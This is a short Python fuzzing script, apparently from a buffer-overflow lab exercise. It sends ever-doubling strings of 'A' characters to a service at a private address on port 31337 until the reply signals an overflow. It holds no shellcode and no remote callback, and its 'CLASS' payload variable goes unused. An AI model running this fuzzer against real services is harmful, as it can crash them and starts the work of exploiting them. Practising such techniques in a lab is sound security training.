#! /usr/bin/env python3
import socket

ip='192.168.229.13'
port=31337

buff = 'A'
payload = 'CLASS ' + buff
overflowed = False
#print(buff)

while overflowed != True:
    try: 
        with socket.socket() as fuzz:
            fuzz.connect((ip,port))
            fuzz.send(bytes(buff,'latin-1'))
            returndata = fuzz.recv((1024))
            print(returndata)
            if b"UNKNOWN COMMAND" in returndata:
                print("You have overflowed the buffer")
                overflowed = True
                break
            else:
                buff = buff * 2
                print("I am sending ")
                print(len(buff))
                print("A's as the paylod")
                fuzz.send(bytes(buff,'latin-1'))
    except ConnectionRefusedError:
        print("The connection was refused!!!!")
        break

